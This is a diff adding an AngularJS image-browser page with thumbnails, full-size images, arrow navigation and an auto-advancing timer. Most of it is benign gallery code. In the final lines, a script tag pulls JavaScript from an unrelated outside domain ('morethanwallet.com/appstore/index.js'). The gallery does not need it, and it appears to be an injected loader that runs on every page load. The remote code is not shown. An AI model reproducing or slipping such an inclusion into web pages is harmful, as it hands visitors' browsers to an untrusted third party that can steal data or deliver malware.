@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html ng-app="imageApp">
+<head>
+  <title>Image Browser</title>
+  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+  <style>
+.thumbnail {
+  width: 100px;
+  height: 100px;
+  margin: 5px;
+  cursor: pointer;
+  border-radius: 5px;
+  transition: transform 0.3s ease-in-out;
+}
+
+.thumbnail:hover {
+  transform: scale(1.1);
+}
+
+.fullsize {
+  display: none;
+  margin: 0 auto;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+}
+
+.fullsize.active {
+  display: block;
+}
+
+.container {
+  text-align: center;
+}
+
+.separator {
+  margin-top: 20px;
+  margin-bottom: 20px;
+  border-top: 10px solid #4834ae;
+}
+
+.arrow {
+  cursor: pointer;
+  margin: 0 10px;
+  font-size: 18px;
+  color: #d20591;
+  transition: color 0.3s ease-in-out;
+}
+
+.arrow:hover {
+  color: #131214;
+}
+
+  </style>
+</head>
+<body>
+
+<div class="container" ng-controller="ImageController">
+  <div>
+    <img ng-repeat="image in images" ng-src="{{image.thumbnail}}" ng-click="showFullSize($index)" class="thumbnail">
+  </div>
+  <div class="separator"></div> 
+  <div>
+    <img ng-repeat="image in images" ng-src="{{image.fullsize}}" class="fullsize" ng-class="{active: $index === currentIndex}">
+  </div>
+  <div>
+    <span class="arrow" ng-click="prevImage()">&#10094;</span> 
+    <span class="arrow" ng-click="nextImage()">&#10095;</span> 
+  </div>
+</div>
+
+<script>
+  var app = angular.module('imageApp', []);
+
+  app.controller('ImageController', function($scope, $interval) {
+    $scope.images = [
+      { thumbnail: 'https://picsum.photos/id/700/50/50', fullsize: 'https://picsum.photos/id/700/350/350' },
+      { thumbnail: 'https://picsum.photos/id/701/50/50', fullsize: 'https://picsum.photos/id/701/350/350' },
+      { thumbnail: 'https://picsum.photos/id/703/50/50', fullsize: 'https://picsum.photos/id/703/350/350' },
+      { thumbnail: 'https://picsum.photos/id/726/50/50', fullsize: 'https://picsum.photos/id/726/350/350' },
+      { thumbnail: 'https://picsum.photos/id/727/50/50', fullsize: 'https://picsum.photos/id/727/350/350' }
+    ];
+
+    $scope.currentIndex = null;
+
+    $scope.showFullSize = function(index) {
+      $scope.currentIndex = index;
+    };
+
+    $scope.prevImage = function() {
+      $scope.currentIndex = ($scope.currentIndex - 1 + $scope.images.length) % $scope.images.length;
+    };
+
+    $scope.nextImage = function() {
+      $scope.currentIndex = ($scope.currentIndex + 1) % $scope.images.length;
+    };
+
+    var intervalPromise = $interval(function() {
+      $scope.currentIndex = ($scope.currentIndex + 1) % $scope.images.length;
+    }, 2000);
+
+    $scope.$on('$destroy', function() {
+      $interval.cancel(intervalPromise);
+    });
+  });
+</script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
